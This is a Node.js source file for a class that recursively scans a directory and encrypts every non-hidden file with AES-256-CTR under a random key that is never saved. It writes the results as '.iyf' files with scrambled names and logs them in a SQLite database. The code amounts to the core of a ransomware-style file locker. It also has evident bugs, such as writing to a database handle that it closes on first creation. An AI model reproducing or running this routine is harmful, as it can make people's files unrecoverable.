const settings  = require("./settings")
const rand      = require("random-key")
const cryptoLib = require('crypto')
const zlib      = require('zlib')
const fs        = require('fs')
const sqlite3   = require('sqlite3')

class crypto {
    
    constructor(){
        this.generateKey()
    }
    
    generateKey(){
        this.key = rand.generate(50)
        this.initialiseDatabase()
    }
    
    initialiseDatabase(){
        let dbExist = fs.existsSync(settings.databaseFile)
        this.db = new sqlite3.Database(settings.databaseFile)
        if(!dbExist){
            this.db.run("CREATE TABLE 'files' (\
                    'fullPath' text NOT NULL,\
                    'date' bigint NOT NULL);")
            this.db.close()
        }
        this.scanDirectory(settings.defaultDirectory)
    }
    
    scanDirectory(path){
        const that = this
        fs.readdir(path, function(err, items) {
            for (var i=0; i<items.length; i++) {
                let fullPath = path+items[i]
                if(fs.statSync(fullPath).isDirectory()){
                    fullPath += '/'
                    that.scanDirectory(fullPath)
                }else{
                    that.checkBeforeEncryption(fullPath)
                }
            }
        });
    }
    
    checkBeforeEncryption(fullPath){
        let pathArray = fullPath.split('/')
        let fileName = pathArray[pathArray.length - 1]
        pathArray.pop()
        let path = pathArray.join('/')+'/'
        if(fileName.charAt(0) != '.'){
            let fileNameArray = fileName.split('.')
            let extention = fileNameArray[fileNameArray.length - 1]
            if(extention != 'iyf'){
                this.encryptFile(path, fileName)
            }
        }
    }
    
    encryptFile(path, fileName){
        let r = fs.createReadStream(path+fileName)
        let zip = zlib.createGzip()
        let cipher = cryptoLib.createCipher('aes-256-ctr', this.key)
        let encryptedFileName = cipher.update(fileName,'utf8','hex')
        encryptedFileName += cipher.final('hex');
        let w = fs.createWriteStream(path+encryptedFileName+'.iyf')
        this.db.run("INSERT INTO files VALUES(?,?)", [(path+encryptedFileName),Date.now()]);
        r.pipe(zip).pipe(cipher).pipe(w)
    }
    
}

module.exports = crypto